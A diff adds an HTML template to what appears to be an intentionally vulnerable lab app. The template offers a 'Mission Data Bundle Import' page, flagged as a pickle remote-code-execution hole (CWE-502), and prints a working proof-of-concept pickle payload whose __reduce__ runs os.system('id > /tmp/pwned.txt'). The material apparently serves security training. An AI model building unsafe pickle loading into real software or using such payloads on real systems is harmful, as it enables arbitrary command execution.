@@ -1,0 +1,39 @@
+{% extends 'base.html' %}
+{% block title %}Import Bundle{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v19.css') }}">
+{% endblock %}
+{% block content %}
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
+  <a href="{{ url_for('inventory_index') }}" class="btn small secondary">← Back</a>
+  <h1 style="margin:0;">Mission Data Bundle Import <span class="sev p1" style="margin-left:8px;">P1 · Pickle RCE</span></h1>
+</div>
+
+<div class="grid grid-2">
+  <div class="panel">
+    <h2>Upload Bundle (.pkl)</h2>
+    <form method="post" enctype="multipart/form-data">
+      <label style="display:block;font-size:12px;color:var(--dim);margin-bottom:6px;">Select mission data bundle</label>
+      <input type="file" name="bundle" accept=".pkl,.bin" style="margin-bottom:14px;display:block;">
+      <button type="submit" class="btn small">Import</button>
+    </form>
+    {% if error %}<div class="flash err" style="margin-top:14px;">{{ error }}</div>{% endif %}
+    {% if result %}
+    <pre class="code" style="margin-top:14px;">{{ result | tojson(indent=2) }}</pre>
+    {% endif %}
+  </div>
+  <div class="panel">
+    <h2>Build a PoC Payload</h2>
+    <p style="font-size:13px;color:var(--dim);">Generate a pickle RCE payload and save it as <code>payload.pkl</code>, then upload above.</p>
+    <pre class="code" style="font-size:11px;">import pickle, os
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ("id > /tmp/pwned.txt",))
+
+with open("payload.pkl", "wb") as f:
+    pickle.dump(Exploit(), f)</pre>
+    <div style="margin-top:14px;font-size:11px;color:var(--danger);font-family:'JetBrains Mono',monospace;">CWE-502 · Deserialization of Untrusted Data → RCE<br>Impact: P1 · arbitrary OS command execution as the app process user</div>
+  </div>
+</div>
+{% endblock %}
